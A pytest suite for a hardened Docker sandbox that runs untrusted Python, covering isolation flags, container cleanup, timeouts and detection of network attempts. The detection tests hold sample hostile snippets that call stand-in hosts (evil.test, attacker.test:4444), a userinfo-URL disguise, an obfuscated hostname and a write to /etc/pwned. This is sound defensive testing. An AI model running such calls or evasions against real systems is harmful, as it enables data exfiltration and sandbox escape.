import shutil
import subprocess

import pytest

from app.env import SimEnv, build_world
from app.policy import Policy
from app.sandbox import (
    DockerSandbox,
    SandboxConfig,
    detect_net_attempts,
    make_python_runner,
)


class FakeExec:
    """Stands in for subprocess.run and records every docker call."""

    def __init__(self, stdout="", stderr="", returncode=0, timeout=False, missing=False):
        self.calls = []
        self.stdout, self.stderr, self.returncode = stdout, stderr, returncode
        self.timeout, self.missing = timeout, missing

    def __call__(self, cmd, input=None, capture_output=True, text=True, timeout=None):
        self.calls.append({"cmd": list(cmd), "input": input, "timeout": timeout})
        if cmd[1] == "rm":
            return subprocess.CompletedProcess(cmd, 1, "", "No such container")
        if self.missing:
            raise FileNotFoundError("docker")
        if self.timeout:
            raise subprocess.TimeoutExpired(cmd, timeout, output=b"partial", stderr=b"")
        return subprocess.CompletedProcess(cmd, self.returncode, self.stdout, self.stderr)


def sandbox(**kw):
    fx = FakeExec(**kw)
    return DockerSandbox(SandboxConfig(), executor=fx), fx


# ---------- hardening flags ----------
def test_run_command_has_all_hardening_flags():
    sb, fx = sandbox(stdout="hi\n")
    sb.run_python("print('hi')")
    cmd = fx.calls[0]["cmd"]
    for flag, val in [
        ("--network", "none"),
        ("--cap-drop", "ALL"),
        ("--security-opt", "no-new-privileges"),
        ("--memory", "256m"),
        ("--memory-swap", "256m"),
        ("--user", "65534:65534"),
    ]:
        assert cmd[cmd.index(flag) + 1] == val
    assert "--read-only" in cmd and "--rm" in cmd
    assert any(a.startswith("/tmp:rw,noexec,nosuid,nodev") for a in cmd)
    assert "--pids-limit" in cmd and "--cpus" in cmd


def test_nothing_from_the_host_is_mounted_or_passed():
    sb, fx = sandbox()
    sb.run_python("print(1)")
    cmd = fx.calls[0]["cmd"]
    for bad in ("-v", "--volume", "--mount", "--privileged", "--pid", "--net=host", "--device"):
        assert bad not in cmd  # exact argument match, so --pids-limit is fine
    assert "docker.sock" not in " ".join(cmd)
    # the only env var is our own harmless constant, never a secret
    envs = [cmd[i + 1] for i, a in enumerate(cmd) if a == "--env"]
    assert envs == ["PYTHONDONTWRITEBYTECODE=1"]
    assert "--env-file" not in cmd


def test_code_goes_over_stdin_not_argv():
    sb, fx = sandbox()
    code = "print('x' * 10)  # not in argv"
    sb.run_python(code)
    call = fx.calls[0]
    assert call["input"] == code
    assert code not in call["cmd"]
    assert call["cmd"][-3:] == ["python", "-I", "-"]


def test_gvisor_runtime_flag_only_when_configured():
    plain, fx1 = sandbox()
    plain.run_python("1")
    assert "--runtime" not in fx1.calls[0]["cmd"]

    fx2 = FakeExec()
    gv = DockerSandbox(SandboxConfig(runtime="runsc"), executor=fx2)
    gv.run_python("1")
    cmd = fx2.calls[0]["cmd"]
    assert cmd[cmd.index("--runtime") + 1] == "runsc"
    assert cmd.index("--runtime") < cmd.index(SandboxConfig().image)


def test_from_env():
    cfg = SandboxConfig.from_env(
        {"SANDBOX_RUNTIME": "runsc", "SANDBOX_TIMEOUT_S": "5", "SANDBOX_IMAGE": "x:1"}
    )
    assert cfg.runtime == "runsc" and cfg.timeout_s == 5.0 and cfg.image == "x:1"
    assert SandboxConfig.from_env({}).runtime is None


# ---------- lifecycle ----------
def test_container_is_destroyed_after_every_run():
    sb, fx = sandbox()
    sb.run_python("print(1)")
    name = fx.calls[0]["cmd"][fx.calls[0]["cmd"].index("--name") + 1]
    assert fx.calls[-1]["cmd"] == ["docker", "rm", "-f", name]


def test_each_run_gets_a_fresh_container_name():
    sb, fx = sandbox()
    sb.run_python("1")
    sb.run_python("2")
    runs = [c["cmd"] for c in fx.calls if c["cmd"][1] == "run"]
    names = {r[r.index("--name") + 1] for r in runs}
    assert len(names) == 2


def test_timeout_is_enforced_and_container_removed():
    sb, fx = sandbox(timeout=True)
    r = sb.run_python("while True: pass")
    assert r.timed_out and r.exit_code == 124
    assert "timeout" in r.stderr
    assert fx.calls[0]["timeout"] == 20.0
    assert fx.calls[-1]["cmd"][1] == "rm"


def test_missing_docker_is_reported_not_raised():
    sb, _ = sandbox(missing=True)
    r = sb.run_python("print(1)")
    assert r.infra_error and r.exit_code == 127


def test_docker_start_failure_flagged_as_infra_error():
    sb, _ = sandbox(returncode=125, stderr="docker: unknown runtime specified runsc")
    r = sb.run_python("print(1)")
    assert r.infra_error


def test_output_is_truncated():
    sb, _ = sandbox(stdout="A" * 10000, stderr="B" * 10000)
    r = sb.run_python("print(1)")
    assert len(r.stdout) == 4000 and len(r.stderr) == 4000


def test_oom_kill_detected():
    sb, _ = sandbox(returncode=137)
    assert sb.run_python("x=bytearray(10**10)").killed


# ---------- net attempt detection ----------
def test_detects_url_host_when_network_fails():
    code = "import urllib.request\nurllib.request.urlopen('http://evil.test/x?k=1')"
    err = "urllib.error.URLError: <urlopen error [Errno -3] Temporary failure in name resolution>"
    assert detect_net_attempts(code, err) == ["evil.test"]


def test_detects_socket_connect_host_and_userinfo_url():
    code = "import socket\ns=socket.create_connection(('attacker.test', 4444))"
    assert detect_net_attempts(code, "OSError: [Errno 101] Network is unreachable") == ["attacker.test"]
    code2 = "import requests\nrequests.get('http://intranet.corp@evil.test:8080/')"
    err2 = "requests.exceptions.ConnectionError: Max retries"
    assert detect_net_attempts(code2, err2) == ["evil.test"]


def test_no_attempt_without_network_failure_or_api():
    assert detect_net_attempts("print(sum(range(10)))", "") == []
    assert detect_net_attempts("print(1/0)", "ZeroDivisionError: division by zero") == []
    # network failure text but nothing network-ish in code -> not an attempt
    assert detect_net_attempts("print(1)", "Connection refused") == []


def test_unknown_host_when_api_used_without_literal():
    code = "import socket\nh=''.join(['e','v']); socket.getaddrinfo(h,80)"
    assert detect_net_attempts(code, "socket.gaierror: Name or service not known") == ["unknown"]


# ---------- integration with SimEnv ----------
def test_runner_plugs_into_simenv_and_records_containment():
    fx = FakeExec(
        returncode=1,
        stderr="urllib.error.URLError: <urlopen error Network is unreachable>",
    )
    runner = make_python_runner(DockerSandbox(SandboxConfig(), executor=fx))
    w = build_world()
    env = SimEnv(w, python_runner=runner)
    r = env.execute(Policy(), "run_python", {"code": "import urllib.request\nurllib.request.urlopen('http://evil.test/')"})
    assert not r.ok
    assert w.contained == ["network:evil.test"]
    assert w.outbound == []  # nothing escaped the sandbox


# ---------- real docker (skipped where docker or the image is missing) ----------
def _real_docker_ready():
    if not shutil.which("docker"):
        return False
    try:
        p = subprocess.run(
            ["docker", "image", "inspect", SandboxConfig().image],
            capture_output=True, timeout=10,
        )
        return p.returncode == 0
    except Exception:
        return False


@pytest.mark.skipif(not _real_docker_ready(), reason="docker or sandbox image not available")
def test_real_container_blocks_network_and_writes():
    sb = DockerSandbox(SandboxConfig.from_env())
    ok = sb.run_python("print(6*7)")
    assert ok.exit_code == 0 and ok.stdout.strip() == "42"
    net = sb.run_python("import urllib.request\nurllib.request.urlopen('http://example.com', timeout=3)")
    assert net.exit_code != 0 and net.net_attempts
    wr = sb.run_python("open('/etc/pwned','w').write('x')")
    assert wr.exit_code != 0
    asroot = sb.run_python("import os; print(os.getuid())")
    assert asroot.stdout.strip() == "65534"
